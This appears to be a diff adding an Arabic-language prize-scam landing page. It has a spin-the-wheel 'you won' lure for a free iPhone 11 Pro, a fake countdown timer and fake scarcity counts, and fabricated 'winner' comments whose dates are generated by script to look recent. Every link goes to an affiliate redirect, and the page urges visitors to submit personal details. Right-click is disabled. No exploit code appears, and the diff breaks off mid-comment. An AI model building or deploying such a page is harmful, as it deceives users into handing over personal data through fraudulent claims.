@@ -1,0 +1,1275 @@
+<!DOCTYPE html><html lang="en-za"><head>
+  <base href="">
+  <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+  <meta name="robots" content="noindex, nofollow, noarchive">
+  <meta name="referrer" content="no-referrer">
+  <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport">
+  <title>!مبروك</title>
+  <meta content="notranslate" name="google">
+  <link id="favicon" rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAAEG0lEQVQ4EQEQBO/7AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/7+0IA5eWVAPX1HQDHxwYAAAAAADo6+gAKCuMAFxdpAQkJwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/yMhY/9HR8P9DQ///zs7///z8////////ICD//w4O///U1PH/w8NVAAAAAAQAoNb/AAAAAAAAAAAAAAAAQhcJAPIG8gAOLy8AAEVFAADMzAAAAQEAADAwAAAAAAAA8vIAACwsDgDU1Jz/9/fqAgAAAAAAAAAAAAAAAAAAAACVH/8ADj06AAAAAAAAu7sAAGZmAADZ2QAAAAAAAAAAAAAAAAAAAAAAADs7DgDo6JcCAAAAAAAAAAAAAAAAMxMIAB399wAA9fUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8fEAAPj4HwIAAAAAAAAAAAAAAAAzEwgABsnIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxsYFAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAzO34APo4OQAAAAAAAAAAAAAfHwAAZGQAACIiAAAAAAAAV1cAAE5OAAAAAAAAAAAAADo6+wIAAAAAAAAAAAAAAADO7fgA4wIIAAAODgAAAAAAADExAACbmwAANTUAAAAAAACIiAAAenoAAAAAAAAREQAABwfhAQCg1v8AAAAAAAAAAAAAAABAFggAsRr1AA4wLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANbW8wAhIUoCAAAAAAAAAAAAAAAAAAAAAMDq+ABk3PwA8tHUAAAPDwAAAAAAAAAAAAAAAAAAAAAAABERAPPT1gAA6OhhAQkJxAEAoNb/AAAAAAAAAAAAAAAAAAAAAAAAAAA/FggAlx//AB8B+wAFx8YAAAAAAPs5OgDh/gUAZuEBAMRLIgEAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMHq+AAq6gAAMBIIADUpSAAAAAAAy9z4ANDu+AAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADQ7vgA0O74AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADA0ZQtaGpDlQAAAABJRU5ErkJggg==" type="image/png" sizes="16x16">
+  <script>
+    function getURLParameter(name) {
+      name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
+      var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
+        results = regex.exec(location.search);
+      return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
+    }
+
+    function dateOffset(f, c) {
+      var b = new Boolean(null == f || 0 == f || void 0 == f || "" == f),
+        h = new Date(Date.now() - 24 * f * 60 * 60 * 1000);
+      1 == b && (f = 0);
+      var d = ["الأحد", "الاثنين", "يوم الثلاثاء", "الأربعاء", "يوم الخميس", "جمعة", "السبت"],
+        g = ["يناير", "شهر فبراير", "مارس", "أبريل", "يمكن", "يونيو", "تموز", "أغسطس", "سبتمبر", "اكتوبر", "شهر نوفمبر", "ديسمبر"
+        ];
+      return null != !c && 0 != !c && void 0 != !c ? h.getDate() + " " + g[h.getMonth()] : "day_name_only" == c && b ?
+        d[h.getDay()] : "top_date" == c && b ? d[h.getDay()] + ", " + h.getDate() + " " + g[h.getMonth()] + " " + h
+        .getFullYear() : void 0
+    }
+  </script>
+  <style>
+.icon,
+.menu {
+    display: inline-block;
+    margin-top: 13px
+}
+
+#wheelCon,
+.icon,
+.menu {
+    background-repeat: no-repeat;
+    background-size: contain
+}
+
+#firstpage,
+#wheelCon {
+    background-color: #fff;
+    border-radius: 3px
+}
+
+#pressButton,
+#wheelCon,
+.icon,
+.menu {
+    background-size: contain
+}
+
+.spinAround,
+.spinAround2 {
+    animation-timing-function: ease;
+    animation-iteration-count: 1;
+    animation-direction: normal
+}
+
+#header,
+#subheadline,
+#topDate,
+.congrats {
+    text-align: center
+}
+
+#secondpage a,
+.button,
+.fm_item,
+.pi_links a,
+a.button {
+    text-decoration: none
+}
+
+.button,
+:focus {
+    outline: 0
+}
+
+ol,
+ul {
+    list-style: decimal inside
+}
+
+#header {
+    background-color: #5d80a6;
+    color: #fff;
+    height: 43px;
+    max-height: 43px;
+    width: 100%;
+    overflow: hidden
+}
+
+#header h3 {
+    display: inline-block;
+    font-size: 1.1em;
+    line-height: 40px;
+    padding-left: 0
+}
+
+.icon {
+    background-image: url(notify_2x.png);
+    width: 20px;
+    height: 18px;
+    float: right;
+    margin-right: 10px
+}
+
+.menu {
+    background-image: url(menu_2x.png);
+    width: 18px;
+    height: 16px;
+    float: left;
+    margin-left: 10px
+}
+
+#devMockup,
+#secondpage {
+    display: none
+}
+
+#container {
+    padding: 6px
+}
+
+#firstpage {
+    margin-bottom: 5px;
+    padding: 5px 10px
+}
+
+#subheadline {
+    font-weight: 400;
+    line-height: 15px
+}
+
+.name,
+.regular_price,
+.your_price {
+    font-weight: 700
+}
+
+.date {
+    font-size: .85em;
+    color: #9c9c9c;
+    margin: 2px 0
+}
+
+#topDate {
+    width: 100%
+}
+
+.intro {
+    margin-bottom: 10px
+}
+
+#wheelCon {
+    position: relative;
+    background-position: center;
+    overflow: hidden
+}
+
+#wheel {
+    z-index: 1;
+    width: 100%;
+    height: auto;
+    margin-top: 5px
+}
+
+#pressButton {
+    position: absolute;
+    background-image: url(spin_prize2.png);
+    cursor: pointer;
+    width: 25%;
+    height: 0;
+    padding-top: 30.5%;
+    z-index: 2;
+    margin-left: auto;
+    margin-right: auto;
+    left: 0;
+    right: 0;
+    top: 110px;
+    border: none;
+    background-color: transparent
+}
+
+.congrats,
+.timer {
+    line-height: 1.5;
+    padding: 8px
+}
+
+#pressButton:disabled {
+    opacity: 1
+}
+
+#devMockup {
+    position: absolute;
+    max-width: 200px;
+    max-height: 270px;
+    height: auto;
+    z-index: 3
+}
+
+@media(min-width:614px) {
+    #wheel {
+        width: 32vw;
+        left: 47vw;
+        top: 27vw
+    }
+
+    #pressButton {
+        width: 6%;
+        top: 38% !important;
+        background-repeat: no-repeat
+    }
+}
+
+.spinAround {
+    -webkit-animation: spin 6.6s;
+    animation: spin 6.6s;
+    -webkit-animation-fill-mode: forwards;
+    -moz-animation-fill-mode: forwards;
+    -o-animation-fill-mode: forwards;
+    -ms-animation-fill-mode: forwards;
+    animation-fill-mode: forwards
+}
+
+@-webkit-keyframes spin {
+    0% {
+        -webkit-transform: rotate(0);
+        -ms-transform: rotate(0);
+        transform: rotate(0)
+    }
+
+    90% {
+        -webkit-transform: rotate(3110deg);
+        -ms-transform: rotate(3110deg);
+        transform: rotate(3110deg)
+    }
+
+    95% {
+        -webkit-transform: rotate(3108deg);
+        -ms-transform: rotate(3108deg);
+        transform: rotate(3108deg)
+    }
+
+    100% {
+        -webkit-transform: rotate(3109deg);
+        -ms-transform: rotate(3109deg);
+        transform: rotate(3109deg)
+    }
+}
+
+@keyframes spin {
+    0% {
+        -webkit-transform: rotate(0);
+        -ms-transform: rotate(0);
+        transform: rotate(0)
+    }
+
+    90% {
+        -webkit-transform: rotate(3110deg);
+        -ms-transform: rotate(3110deg);
+        transform: rotate(3110deg)
+    }
+
+    95% {
+        -webkit-transform: rotate(3108deg);
+        -ms-transform: rotate(3108deg);
+        transform: rotate(3108deg)
+    }
+
+    100% {
+        -webkit-transform: rotate(3109deg);
+        -ms-transform: rotate(3109deg);
+        transform: rotate(3109deg)
+    }
+}
+
+.spinAround2 {
+    -webkit-animation: spin2 6.6s;
+    animation: spin2 6.6s;
+    -webkit-animation-fill-mode: forwards;
+    -moz-animation-fill-mode: forwards;
+    -o-animation-fill-mode: forwards;
+    -ms-animation-fill-mode: forwards;
+    animation-fill-mode: forwards
+}
+
+@-webkit-keyframes spin2 {
+    0% {
+        -webkit-transform: rotate(3109deg);
+        -ms-transform: rotate(3109deg);
+        transform: rotate(3109deg)
+    }
+
+    90% {
+        -webkit-transform: rotate(6314deg);
+        -ms-transform: rotate(6314deg);
+        transform: rotate(6314deg)
+    }
+
+    95% {
+        -webkit-transform: rotate(6312deg);
+        -ms-transform: rotate(6312deg);
+        transform: rotate(6312deg)
+    }
+
+    100% {
+        -webkit-transform: rotate(6313deg);
+        -ms-transform: rotate(6313deg);
+        transform: rotate(6313deg)
+    }
+}
+
+@keyframes spin2 {
+    0% {
+        -webkit-transform: rotate(3109deg);
+        -ms-transform: rotate(3109deg);
+        transform: rotate(3109deg)
+    }
+
+    90% {
+        -webkit-transform: rotate(6314deg);
+        -ms-transform: rotate(6314deg);
+        transform: rotate(6314deg)
+    }
+
+    95% {
+        -webkit-transform: rotate(6312deg);
+        -ms-transform: rotate(6312deg);
+        transform: rotate(6312deg)
+    }
+
+    100% {
+        -webkit-transform: rotate(6313deg);
+        -ms-transform: rotate(6313deg);
+        transform: rotate(6313deg)
+    }
+}
+
+.animated {
+    -webkit-animation-duration: 1s;
+    animation-duration: 1s;
+    -webkit-animation-fill-mode: both;
+    animation-fill-mode: both
+}
+
+@-webkit-keyframes rotateIn {
+    0% {
+        -webkit-transform-origin: center;
+        transform-origin: center;
+        -webkit-transform: rotate3d(0, 0, 1, -200deg);
+        transform: rotate3d(0, 0, 1, -200deg);
+        opacity: 0
+    }
+
+    100% {
+        -webkit-transform-origin: center;
+        transform-origin: center;
+        -webkit-transform: none;
+        transform: none;
+        opacity: 1
+    }
+}
+
+@keyframes rotateIn {
+    0% {
+        -webkit-transform-origin: center;
+        transform-origin: center;
+        -webkit-transform: rotate3d(0, 0, 1, -200deg);
+        transform: rotate3d(0, 0, 1, -200deg);
+        opacity: 0
+    }
+
+    100% {
+        -webkit-transform-origin: center;
+        transform-origin: center;
+        -webkit-transform: none;
+        transform: none;
+        opacity: 1
+    }
+}
+
+.rotateIn {
+    -webkit-animation-name: rotateIn;
+    animation-name: rotateIn
+}
+
+* {
+    margin: 0
+}
+
+.button {
+    -moz-box-shadow: inset 0 1px 0 0 #7a8eb9;
+    -webkit-box-shadow: inset 0 1px 0 0 #7a8eb9;
+    box-shadow: inset 0 1px 0 0 #7a8eb9;
+    background: -webkit-gradient(linear, left top, left bottom, color-stop(.05, #637aad), color-stop(1, #5972a7));
+    background: -moz-linear-gradient(top, #637aad 5%, #5972a7 100%);
+    background: -webkit-linear-gradient(top, #637aad 5%, #5972a7 100%);
+    background: -o-linear-gradient(top, #637aad 5%, #5972a7 100%);
+    background: -ms-linear-gradient(top, #637aad 5%, #5972a7 100%);
+    background: linear-gradient(to bottom, #637aad 5%, #5972a7 100%);
+    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#637aad', endColorstr='#5972a7', GradientType=0)
+}
+
+.congrats,
+.prize,
+.timer {
+    background-color: #fff;
+    margin-bottom: 5px;
+    border-radius: 3px
+}
+
+.smallfont {
+    font-size: 12px
+}
+
+.name {
+    color: #3c5a96;
+    font-size: 100%
+}
+
+.congrats h4 {
+    font-size: 20px
+}
+
+.timer {
+    font-size: 12px
+}
+
+ol {
+    padding-left: 0;
+    overflow-x: visible
+}
+
+ol li {
+    list-style-type: decimal
+}
+
+@media screen and (max-width:359px) {
+    .button {
+        width: 150px !important
+    }
+
+    .like-line-menu__item {
+        float: left
+    }
+
+    .send-comments--submit {
+        width: 65px !important
+    }
+}
+
+.red_text {
+    color: red
+}
+
+.your_price span {
+    color: green
+}
+
+body {
+    background: #fff !important;
+    margin: 0;
+    padding: 0;
+    font-family: helvetica, arial, sans-serif;
+    font-size: small
+}
+
+.border_bottom {
+    border-bottom: 1px solid #dfe3e8
+}
+
+.like_people {
+    height: 38px;
+    display: table;
+    padding: 0 0 1px;
+    margin: 0 -2px 5px
+}
+
+.like_people_images {
+    display: table-cell;
+    vertical-align: middle;
+    white-space: nowrap
+}
+
+.like_people_image_wrap:first-child {
+    z-index: 1;
+    margin: 0
+}
+
+.like_people_image_wrap {
+    width: 24px;
+    height: 24px;
+    border-radius: 100%;
+    display: inline-block;
+    vertical-align: top;
+    margin: 0 0 0 -10px;
+    position: relative;
+    border: 2px solid #fff;
+    overflow: hidden
+}
+
+.like_people_image {
+    width: 24px;
+    height: 24px;
+    border-radius: 100%;
+    overflow: hidden
+}
+
+.like_people_text {
+    display: table-cell;
+    vertical-align: middle;
+    font-size: 13px;
+    line-height: 14px;
+    color: #909499;
+    letter-spacing: -.08px;
+    padding: 0 0 0 6px
+}
+
+.wi_buttons {
+    padding: 0;
+    position: relative;
+    overflow: visible;
+    height: 46px
+}
+
+.item_like,
+.item_share,
+.item_views {
+    color: #999;
+    padding: 4px;
+    margin-left: 1px;
+    font-weight: 700
+}
+
+.wi_buttons_wrap {
+    display: table;
+    min-width: 100%;
+    padding: 2px 0 0 2px;
+    box-sizing: border-box;
+    margin: 0 0 0 -14px
+}
+
+.wi_buttons .like_wrap {
+    display: table
+}
+
+.wi_buttons .item_like,
+.wi_buttons .item_share {
+    float: none;
+    margin: 0;
+    background: 0 0
+}
+
+.wi_buttons .item_like,
+.wi_buttons .item_share,
+.wi_buttons .item_views {
+    display: table-cell;
+    vertical-align: top;
+    line-height: 20px;
+    padding: 10px 12px 11px;
+    text-align: left;
+    min-width: 60px
+}
+
+.item_date,
+.pi_acts_link .i_icon,
+.wi_buttons b {
+    display: inline-block;
+    vertical-align: top
+}
+
+.wi_buttons i.i_like {
+    background-position: 0 -60px !important
+}
+
+.wi_buttons i.i_share {
+    background-position: 0 -100px !important
+}
+
+.wi_buttons i.i_views {
+    background-position: 0 -160px !important
+}
+
+.wi_buttons .item_views {
+    width: 100%;
+    text-align: right;
+    padding: 10px 0;
+    -webkit-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none
+}
+
+.wi_buttons i.i_like,
+.wi_buttons i.i_share,
+.wi_buttons i.i_views {
+    background-image: url(action_icons_20px_2x.png);
+    display: inline-block;
+    vertical-align: top;
+    width: 20px;
+    height: 20px;
+    margin: 0;
+    padding: 0;
+    background-size: 100% !important;
+    background-repeat: no-repeat
+}
+
+.wi_buttons i.i_like,
+.wi_buttons i.i_share {
+    float: left
+}
+
+.wi_buttons b {
+    color: #909499;
+    font-size: 15px;
+    font-weight: 400;
+    line-height: 20px;
+    letter-spacing: -.2px;
+    margin: 0 0 0 6px !important
+}
+
+.photo_avatar img {
+    border-radius: 50%;
+    height: 40px;
+    width: 40px
+}
+
+.comment_name {
+    font-size: 14px;
+    color: #426997;
+    font-weight: 600
+}
+
+.comment_text {
+    font-size: 14px;
+    line-height: 19px;
+    padding: 0;
+    margin-top: 2px;
+    letter-spacing: -.22px
+}
+
+.pi_links,
+.pi_links a,
+.show_next {
+    line-height: 16px
+}
+
+.item_date,
+.pi_links a {
+    font-size: 13px;
+    letter-spacing: -.08px
+}
+
+.item_date {
+    color: #909499
+}
+
+.pi_links {
+    font-size: 13px;
+    color: #909499;
+    padding: 0;
+    margin: 5px 0 0;
+    overflow: hidden
+}
+
+.pi_links a {
+    padding: 0;
+    margin: 0 3px;
+    color: #4c6b8f;
+    cursor: pointer
+}
+
+.pi_acts_link {
+    margin: 0 !important;
+    float: right;
+    -webkit-tap-highlight-color: transparent
+}
+
+.pi_acts_link .i_icon {
+    background-image: url(comment_action_2x.png);
+    background-position: 0 0;
+    margin: 2px 0 0;
+    background-repeat: no-repeat;
+    background-size: 100% !important;
+    width: 12px;
+    height: 12px;
+    padding: 0
+}
+
+.comments hr {
+    margin: 0 !important
+}
+
+.show_next_wrap {
+    padding: 0 0 1px;
+    border: 0;
+    text-align: center
+}
+
+.show_next {
+    font-size: 14px !important;
+    color: #426997;
+    padding: 15px 0;
+    font-weight: 400;
+    border-radius: 0;
+    border: 0;
+    background: 0 0;
+    display: block
+}
+
+.create_post {
+    background-color: #f1f1f1;
+    border-top: 1px solid #eaeaea;
+    border-bottom: 1px solid #e1e1e1;
+    position: relative;
+    margin-top: -1px;
+    padding: 7px
+}
+
+.comment_item .pi_cont {
+    margin-left: 0;
+    min-height: 34px
+}
+
+.iwrap {
+    margin: 0 6px 0 0
+}
+
+.pi_cont .textfield {
+    height: 3.6em
+}
+
+.create_post .textfield {
+    padding-top: 3px;
+    padding-bottom: 3px;
+    resize: vertical
+}
+
+.textfield {
+    vertical-align: top;
+    width: 100%;
+    min-width: 30px;
+    border: 1px solid #b9c4d1;
+    padding: 2px;
+    margin: 0;
+    -webkit-appearance: none;
+    background: #fff;
+    outline: 0;
+    box-shadow: none;
+    font-size: 14px;
+    box-sizing: content-box;
+    border-radius: 4px
+}
+
+.mfoot {
+    background-color: #f5f5f5
+}
+
+.pfoot {
+    padding: 10px 0
+}
+
+.footer_menu {
+    text-align: center;
+    margin: 5px 0;
+    line-height: 1.6em
+}
+
+.fm_row {
+    display: inline;
+    white-space: nowrap
+}
+
+.button,
+.clearfix {
+    display: block
+}
+
+.fm_item {
+    padding: 4px 6px;
+    font-size: .93em;
+    color: #8a8a8a
+}
+
+.container {
+    padding: 0 12px 8px
+}
+
+.button {
+    width: 170px;
+    padding: 0 8px;
+    margin-top: 8px;
+    text-align: center;
+    background-color: #3b5998;
+    background-image: -moz-linear-gradient(center top, #0c98c5, #0c98c5);
+    border: 0 solid #4ec8ef;
+    text-shadow: 0 0 rgba(0, 0, 0, .1);
+    border-radius: 1px;
+    cursor: default;
+    color: #fff;
+    font-size: 20px;
+    font-weight: 700;
+    height: 33px;
+    line-height: 33px
+}
+
+.comments {
+    background: #fff;
+    border-radius: 3px;
+    margin: 0;
+    padding: 0 0 30px
+}
+
+.comments__item__meta {
+    font-size: 9px;
+    line-height: 14px;
+    margin-top: 6px
+}
+
+td {
+    background-color: transparent;
+    -webkit-transition: all .3s ease-in;
+    -moz-transition: all .3s ease-in;
+    -ms-transition: all .3s ease-in;
+    -o-transition: all .3s ease-in;
+    transition: all .3s ease-in
+}
+
+hr {
+    height: 0;
+    font-size: 0;
+    line-height: 0;
+    border: none;
+    background: 0 0;
+    border-bottom: 1px #dadde1 solid;
+    margin: 0 5px
+}
+
+ul {
+    padding-left: 0;
+    overflow-x: visible
+}
+
+.clearfix:after {
+    content: " ";
+    display: block;
+    height: 0;
+    clear: both;
+    overflow: hidden;
+    visibility: hidden
+}
+
+@media screen and (min-width:460px) {
+    .comments__item__meta {
+        font-size: 8px
+    }
+}
+
+.fbimg {
+    margin-top: 10px
+}
+
+.fixed_footer {
+    position: fixed;
+    bottom: 0;
+    height: 50px;
+    border-top: 1px solid #e4e4e4;
+    background-color: #fff;
+    left: 0;
+    right: 0;
+    z-index: 10;
+    box-shadow: 0 0 10px rgba(0, 0, 0, .2)
+}
+
+.footer_input {
+    color: #a0a4a3;
+    border: none;
+    margin-right: 0;
+    font-size: 18px;
+    position: absolute;
+    left: 45px;
+    top: 13px
+}
+
+.btn_send,
+.clip {
+    max-height: 30px;
+    position: absolute;
+    top: 10px
+}
+
+.clip {
+    left: 10px
+}
+
+.btn_send {
+    right: 10px
+}
+
+@media screen and (max-device-width:480px) {
+    body {
+        -webkit-text-size-adjust: none
+    }
+}
+  </style>
+</head>
+
+<body oncontextmenu="return!1" onload="setButtonHeight(),autospin1()">
+  <div id="header">
+    <span class="menu"></span>
+    <h3><span id="headline">برنامج كسب النقاط</span></h3><span class="icon"></span>
+  </div>
+  <div id="container">
+    <div align="center" id="firstpage">
+      <div class="date" id="topDate" style="padding-bottom:10px;margin:0">
+        <script>
+          document.write(dateOffset(0, "top_date"));
+        </script>
+      </div>
+      <div style="margin-bottom:2px">
+        <div id="subheadline">
+          <p style="font-size:18px"><b>!مبروك</b></p>
+          <p style="padding-top:10px">انهردة انت محظوظ!</p>
+        </div>
+        <div class="intro" style="padding-top:5px">
+          انهردة بنقدم للمستخدمين الفرصة لكسب الجوايز من الكفلاء. لف العجلة عشان نشوف جايزتك
+        </div>
+        <div id="wheelCon">
+          <img class="spinAround2 transparent" height="501" id="wheel" src="pw_i11.png" width="501"> <input id="pressButton" onclick="spin()" style="top: 106.2px;" type="button">
+          <div><img class="animated rotateIn" id="devMockup" src="phone.png" style="display: hidden; left: 64px; top: 42px;"></div>
+        </div>
+      </div>
+      <div id="secondpage">
+        <div class="congrats">
+          <h4>
+            <a href="https://singapore.affiliateplanet.cc/cajjl4k.php?lp=1" style="cursor:pointer!important"  PreventExitPop="false" rel="noreferrer">
+              <font color="#3C5A96">!مبروك<br> !تقدر دلوقتى تكسب ايفون برو١١ </font>
+            </a>
+          </h4>
+        </div>
+        <div class="congrats" style="text-align:left">
+          <ol>
+            <li>ختار اللون المفضل ليك و هيتم تحويلك لموقع</li>
+            <li>دخل بياناتك عشان تضمن انك تكسب الجايزة</li>
+          </ol>
+          <b>:مهم</b>!الجوايز ممكن تخلص فى اى وقت .اختار بسرعة
+        </div>
+        <div class="timer">العرض سارى لمدة
+          <font color="red"><b> ثانية<span id="hsecs">٥٩</span> دقايق و <span id="mins">٤</span></b></font>
+        </div>
+        <div class="prize">
+          <table>
+            <tbody>
+              <tr>
+                <th></th>
+                <td style="padding:10px 5px 10px 0;text-align:center"><img src="phone-0.jpg" style="max-width:100px"></td>
+                <td style="line-height:1.6">
+                  <p style="text-align:left"><a href="https://singapore.affiliateplanet.cc/cajjl4k.php?lp=1" style="cursor:pointer!important"  PreventExitPop="false" rel="noreferrer"><span class="name">ايفون ١١ برو ٦٤ جيجا بايت (فضى)</span></a></p>
+                  <p><span class="smallfont">٥.٨ شاشة عرض رتينا مميزة</span></p>
+                  <p class="regular_price"><s class="red_text">
+                    ٢٠،٤٩٩
+                  </s>:سعر التجزئة </p>
+                  <p class="your_price"><span>
+                    ٠ (مجانا)
+                  </span>:السعر المتاح </p>
+                  <p class="remaining"><b><span>١</span>:المتاح </b></p>
+                  <div>
+                    <a class="button" href="https://singapore.affiliateplanet.cc/cajjl4k.php?lp=1" style="cursor:pointer!important"  PreventExitPop="false" rel="noreferrer"> اختار </a>
+                  </div>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="prize">
+          <table>
+            <tbody>
+              <tr>
+                <th></th>
+                <td style="padding:10px 5px 10px 0;text-align:center"><img src="phone-1.jpg" style="max-width:100px"></td>
+                <td style="line-height:1.6">
+                  <p style="text-align:left"><a href="https://singapore.affiliateplanet.cc/cajjl4k.php?lp=1" style="cursor:pointer!important"  PreventExitPop="false" rel="noreferrer"><span class="name">ايفون ١١ برو ٦٤ جيجا بايت (فضى سماوى)</span></a></p>
+                  <p><span class="smallfont">٥.٨ شاشة عرض رتينا مميزة</span></p>
+                  <p class="regular_price"><s class="red_text">
+                      ٢٠،٤٩٩
+                    </s>:سعر التجزئة </p>
+                <p class="your_price"><span>
+                    ٠ (مجانا)
+                  </span>:السعر المتاح </p>
+                  <p class="remaining"><b><span>٣</span>:المتاح </b></p>
+                  <div>
+                    <a class="button" href="https://singapore.affiliateplanet.cc/cajjl4k.php?lp=1" style="cursor:pointer!important"  PreventExitPop="false" rel="noreferrer"> اختار </a>
+                  </div>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+    <div class="container">
+      <div class="comments">
+        <div class="wi_like_wrap border_bottom">
+          <span class="like_people"><span class="like_people_images"><span class="like_people_image_wrap"><img class="like_people_image" height="24" src="like_user_1.jpg" width="24"></span> <span class="like_people_image_wrap"><img class="like_people_image" height="24" src="like_user_2.jpg" width="24"></span></span>
+            <span class="like_people_text">١٥٣٧ اعجبهم ذلك</span></span>
+        </div>
+        <div class="wi_buttons border_bottom">
+          <div class="wi_buttons_wrap">
+            <span class="like_wrap"><span class="item_like _i"><i class="i_like"></i> <b class="v_like">١٥٣٧</b></span>
+              <span class="item_share is_empty _i"><i class="i_share"></i> <b class="v_share">٢٣٤</b></span></span>
+            <span class="item_views"><i class="i_views"></i> <b class="v_views">٥٤٤ الف</b></span>
+          </div>
+        </div>
+        <center>
+          <font face="arial"></font>
+          <table border="0" cellpadding="4" cellspacing="0" style="padding-top:10px;font-size:13px" width="100%">
+            <tbody id="comments_list">
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img src="za17.jpg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_name">لاستير</div>
+                  <div class="comment_text">كسبت اى فون ١١ برو ! بأمانة كان نفسى اكسب اى ماك بس فرصة تانية</div>
+                  <div class="comments__item__meta">
+                    <div class="item_date">أمس الساعة ١٣:٠٨</div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">يحب</span></span> <span class="pi_reply_wrap">·
+                      <span>تعليق</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td colspan="2">
+                  <hr>
+                </td>
+              </tr>
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img src="za12.jpg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_name">تونى هوبس</div>
+                  <div class="comment_text">انا كسبت لف العجلة مرة مجانا لكن مكسبتش الجايزة .ممكن اجرب تانى؟
+                  </div>
+                  <div class="comments__item__meta">
+                    <div class="item_date">
+                      <script>
+                        document.write(dateOffset(2));
+                      </script>
+                    </div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">يحب</span></span> <span class="pi_reply_wrap">·
+                      <span>تعليق</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td colspan="2">
+                  <hr>
+                </td>
+              </tr>
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img src="za13.jpg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_name">راتكو مونرو</div>
+                  <div class="comment_text">انا اخترت اى ماك دلوقتى! دى حقيقى افضل جايزة!
+                  </div>
+                  <div class="comments__item__meta">
+                    <div class="item_date">
+                      <script>
+                        document.write(dateOffset(2));
+                      </script>
+                    </div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">يحب</span></span> <span class="pi_reply_wrap">·
+                      <span>تعليق</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td colspan="2">
+                  <hr>
+                </td>
+              </tr>
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img src="za14.jpg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_name">مارتا ارفن</div>
+                  <div class="comment_text">فى الاول كنت فاكرة انة مش حقيقى لكن انهردة الصبح استلمت الايفون برو ١١ و تى شيرت علية الشعار كمان.
+                  </div>
+                  <div class="comments__item__meta">
+                    <div class="item_date">
+                      <script>
+                        document.write(dateOffset(2));
+                      </script>
+                    </div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">يحب</span></span> <span class="pi_reply_wrap">·
+                      <span>تعليق</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td colspan="2">
+                  <hr>
+                </td>
+              </tr>
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img src="za15.jpg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_name">سوزانا تاكر</div>
+                  <div class="comment_text">ستلمت اى ماك بتاعى انهردة الصبح. جميل جدا !
+                  </div>
+                  <div class="comments__item__meta">
+                    <div class="item_date">
+                      <script>
+                        document.write(dateOffset(3));
+                      </script>
+                    </div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">يحب</span></span> <span class="pi_reply_wrap">·
+                      <span>تعليق</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td colspan="2">
+                  <hr>
+                </td>
+              </tr>
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img src="za16.jpg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_name">مارجريتا هوبسون</div>
+                  <div class="comment_text">كسبت الاى باد ! مش قادرة اصدق ان دة حصل بجد !
+                  </div>
+                  <div class="comments__item__meta">
+                    <div class="item_date">
+                      <script>
+                        document.write(dateOffset(3));
+                      </script>
+                    </div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">يحب</span></span> <span class="pi_reply_wrap">·
+                      <span>تعليق</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td colspan="2">
+                  <hr>
+                </td>
+              </tr>
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img src="za11.jpg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_name">داليبور روبنز</div>
